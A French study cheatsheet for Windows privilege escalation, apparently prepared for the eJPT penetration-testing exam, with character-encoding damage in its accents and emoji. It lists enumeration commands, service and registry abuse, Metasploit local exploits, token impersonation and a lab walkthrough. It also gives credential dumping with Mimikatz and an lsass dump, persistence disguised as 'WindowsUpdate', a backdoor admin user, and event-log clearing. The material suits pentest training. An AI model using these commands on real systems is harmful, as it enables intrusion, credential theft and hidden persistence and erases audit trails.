# üîì Windows Privilege Escalation - Cheatsheet eJPT

## üîç 1. Enum√©ration initiale

### Informations syst√®me de base
| Commande | Description |
|----------|-------------|
| `whoami` | Utilisateur actuel |
| `whoami /priv` | Privil√®ges de l'utilisateur |
| `whoami /groups` | Groupes de l'utilisateur |
| `systeminfo` | Informations syst√®me d√©taill√©es |
| `hostname` | Nom de la machine |
| `net user` | Liste des utilisateurs locaux |
| `net localgroup` | Groupes locaux |
| `net localgroup administrators` | Membres du groupe administrateurs |

### Informations r√©seau
| Commande | Description |
|----------|-------------|
| `ipconfig /all` | Configuration r√©seau compl√®te |
| `netstat -an` | Connexions r√©seau actives |
| `arp -a` | Table ARP |
| `route print` | Table de routage |
| `netsh firewall show config` | Configuration firewall |

---

## üõ†Ô∏è 2. Outils d'√©num√©ration automatis√©s

### PrivescCheck.ps1 (PowerShell)
| Commande | Description |
|----------|-------------|
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"` | Scan complet avec PrivescCheck |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"` | Scan √©tendu |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_$env:COMPUTERNAME"` | G√©n√©ration de rapport |

### WinPEAS
| Commande | Description |
|----------|-------------|
| `winPEASany.exe` | Scan automatis√© complet |
| `winPEASany.exe quiet` | Mode silencieux |
| `winPEASany.exe systeminfo` | Informations syst√®me uniquement |

### PowerUp.ps1
| Commande | Description |
|----------|-------------|
| `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"` | V√©rifications compl√®tes |
| `powershell -ep bypass -c ". .\PowerUp.ps1; Get-UnquotedService"` | Services non quot√©s |
| `powershell -ep bypass -c ". .\PowerUp.ps1; Get-ModifiableServiceFile"` | Fichiers de services modifiables |

---

## üîë 3. Techniques d'escalade courantes

### Services mal configur√©s
| Technique | Commande |
|-----------|----------|
| **Services non quot√©s** | `wmic service get name,displayname,pathname,startmode \|findstr /i "Auto" \|findstr /i /v "C:\Windows\\" \|findstr /i /v """` |
| **Permissions de services** | `sc qc [service_name]` |
| **Modification de service** | `sc config [service_name] binpath= "C:\temp\payload.exe"` |
| **Red√©marrage de service** | `sc stop [service_name]` puis `sc start [service_name]` |

### T√¢ches planifi√©es
| Commande | Description |
|----------|-------------|
| `schtasks /query /fo LIST /v` | Liste des t√¢ches planifi√©es |
| `tasklist /SVC` | Services et processus |
| `wmic process list full` | Processus d√©taill√©s |

### Registre Windows
| Technique | Commande |
|-----------|----------|
| **AutoLogon credentials** | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` |
| **Programmes de d√©marrage** | `reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| **Programmes de d√©marrage (machine)** | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| **AlwaysInstallElevated** | `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |

---

## üéØ 4. Exploitation avec credentials trouv√©s

### Utilisation de runas
| Commande | Description |
|----------|-------------|
| `runas /user:administrator cmd` | Lancer cmd en tant qu'admin |
| `runas /user:domain\administrator cmd` | Avec domaine |
| `runas /savecred /user:administrator cmd` | Utiliser credentials sauvegard√©s |

### PsExec
| Commande | Description |
|----------|-------------|
| `psexec.exe -u administrator -p password cmd` | Ex√©cution distante |
| `psexec.exe \\target -u administrator -p password cmd` | Sur machine distante |

### Metasploit psexec
credential obligatoire

| module               | Description |
|----------------------|-------------|
| `windows/smb/psexec` | Ex√©cution distante |

---

## üöÄ 5. Techniques avanc√©es avec Metasploit

### Modules utiles
| Module | Description |
|--------|-------------|
| `post/windows/gather/enum_logged_on_users` | Utilisateurs connect√©s |
| `post/windows/gather/credentials/windows_autologin` | Credentials AutoLogon |
| `post/windows/gather/hashdump` | Dump des hashs |
| `post/windows/gather/smart_hashdump` | Dump intelligent |
| `post/windows/escalate/getsystem` | Tentative d'escalade automatique |

### Local exploits dans Metasploit
| Exploit | CVE | Description |
|---------|-----|-------------|
| `exploit/windows/local/ms10_015_kitrap0d` | CVE-2010-0232 | Windows 7/2008/Vista/XP |
| `exploit/windows/local/ms10_092_schelevator` | CVE-2010-3338 | Task Scheduler |
| `exploit/windows/local/ms13_053_schlamperei` | CVE-2013-1300 | Win32k.sys |
| `exploit/windows/local/ms13_081_track_popup_menu` | CVE-2013-3881 | TrackPopupMenu Win32k |
| `exploit/windows/local/ms14_058_track_popup_menu` | CVE-2014-4113 | TrackPopupMenu Win32k |
| `exploit/windows/local/ms15_051_client_copy_image` | CVE-2015-1701 | Windows ClientCopyImage |
| `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | CVE-2016-0099 | Secondary Logon Handle |

---

## üîê 6. Dump de credentials

### Mimikatz
| Commande | Description |
|----------|-------------|
| `privilege::debug` | Activer les privil√®ges debug |
| `sekurlsa::logonpasswords` | Dump passwords en m√©moire |
| `sekurlsa::wdigest` | Credentials WDigest |
| `sekurlsa::kerberos` | Tickets Kerberos |
| `lsadump::sam` | Dump SAM |
| `lsadump::secrets` | Dump LSA secrets |

### Autres outils
| Outil | Commande |
|-------|----------|
| **secretsdump.py** | `secretsdump.py domain/user:pass@target` |
| **LaZagne** | `laZagne.exe all` |
| **procdump + mimikatz** | `procdump.exe -ma lsass.exe lsass.dmp` |

---

## üé≠ 7. Impersonation de tokens avec Incognito

### Configuration et utilisation d'Incognito
| √âtape | Commande | Description |
|-------|----------|-------------|
| **Charger le module** | `load incognito` | Charge le module Incognito dans Meterpreter |
| **Lister les tokens utilisateurs** | `list_tokens -u` | Affiche les tokens utilisateurs disponibles |
| **Lister les tokens groupes** | `list_tokens -g` | Affiche les tokens de groupes disponibles |
| **Impersonner un token** | `impersonate_token DOMAIN\\Administrator` | Impersonne le token sp√©cifi√© |
| **V√©rifier l'identit√©** | `getuid` | Confirme l'identit√© actuelle apr√®s impersonation |

### Workflow d'exploitation avec Incognito
| Ordre | Action | Commande |
|-------|--------|----------|
| **1** | **Obtenir shell Meterpreter** | Via exploit (ex: `exploit/windows/http/rejetto_hfs_exec`) |
| **2** | **V√©rifier privil√®ges actuels** | `getuid` |
| **3** | **Charger Incognito** | `load incognito` |
| **4** | **√ânum√©rer tokens** | `list_tokens -u` |
| **5** | **Impersonner Administrator** | `impersonate_token DOMAIN\\Administrator` |
| **6** | **Confirmer escalade** | `getuid` |

### Techniques compl√©mentaires avec tokens
| Technique | Commande | Description |
|-----------|----------|-------------|
| **Steal token** | `steal_token [PID]` | Vole le token d'un processus sp√©cifique |
| **Rev2self** | `rev2self` | Retourne au token original |
| **Add user** | `add_user hacker password123 -h` | Ajoute un utilisateur avec les privil√®ges actuels |
| **Add to admin group** | `add_group_user "Domain Admins" hacker -h` | Ajoute l'utilisateur au groupe administrateurs |

### Exemple pratique - Lab eJPT
```bash
# 1. Exploitation initiale
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS target_ip
exploit

# 2. V√©rification privil√®ges
getuid  # R√©sultat: NT AUTHORITY\LOCAL SERVICE

# 3. Impersonation
load incognito
list_tokens -u
# R√©sultat: ATTACKDEFENSE\Administrator disponible
impersonate_token ATTACKDEFENSE\\Administrator
getuid  # R√©sultat: ATTACKDEFENSE\Administrator

# 4. Acc√®s aux fichiers privil√©gi√©s
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

### Cas d'usage courants
| Sc√©nario | Solution |
|----------|----------|
| **Service account compromise** | √ânum√©rer tokens disponibles pour escalade |
| **Domain admin token** | Impersonner pour acc√®s domaine complet |
| **System token** | Utiliser pour maximum de privil√®ges |
| **Backup/Restore privileges** | Exploiter pour lecture/√©criture fichiers syst√®me |


---

## ‚ö†Ô∏è 8. V√©rifications de s√©curit√© communes

### UAC (User Account Control)
| Commande | Description |
|----------|-------------|
| `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | Statut UAC |
| `whoami /groups \| find "High Mandatory Level"` | V√©rifier niveau d'int√©grit√© |

### Antivirus et EDR
| Commande | Description |
|----------|-------------|
| `wmic /namespace:\\root\securitycenter2 path antivirusproduct` | Antivirus install√©s |
| `sc query windefend` | Windows Defender |
| `netsh advfirewall show allprofiles` | √âtat firewall |

---

## üîß 9. Post-exploitation

### Persistence
| Technique | Commande |
|-----------|----------|
| **T√¢che planifi√©e** | `schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc onlogon /ru System` |
| **Service** | `sc create "WindowsUpdate" binPath= "C:\temp\payload.exe"` |
| **Registre Run** | `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\temp\payload.exe"` |

### Nettoyage des traces
| Commande | Description |
|----------|-------------|
| `wevtutil cl System` | Effacer logs syst√®me |
| `wevtutil cl Security` | Effacer logs s√©curit√© |
| `wevtutil cl Application` | Effacer logs application |

---

## üí° 10. Conseils pour l'eJPT

### Workflow recommand√©
1. **√ânum√©ration manuelle** ‚Üí `whoami`, `systeminfo`, `net user`
2. **Script automatis√©** ‚Üí PrivescCheck.ps1 ou WinPEAS
3. **Recherche d'exploits** ‚Üí Selon version Windows
4. **Test credentials** ‚Üí Registry, fichiers config
5. **Exploitation** ‚Üí runas, PsExec, ou exploit kernel
6. **Persistence** ‚Üí Si n√©cessaire pour le lab

### Points d'attention eJPT
- **Toujours commencer par l'√©num√©ration manuelle**
- **PrivescCheck.ps1 est tr√®s efficace** pour trouver des misconfigurations
- **V√©rifier le registre** pour AutoLogon credentials
- **Tester runas** avec credentials trouv√©s
- **Metasploit HTA** est une technique courante dans les labs
- **Documenter toutes les √©tapes** pour le rapport

### Commandes essentielles √† retenir
```powershell
# √ânum√©ration rapide
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# Recherche credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Runas
runas /user:administrator cmd
```

**üéØ Conseil final** : Dans l'eJPT, les techniques les plus courantes sont les misconfigurations de services, AutoLogon credentials, et l'utilisation de runas avec des credentials d√©couverts !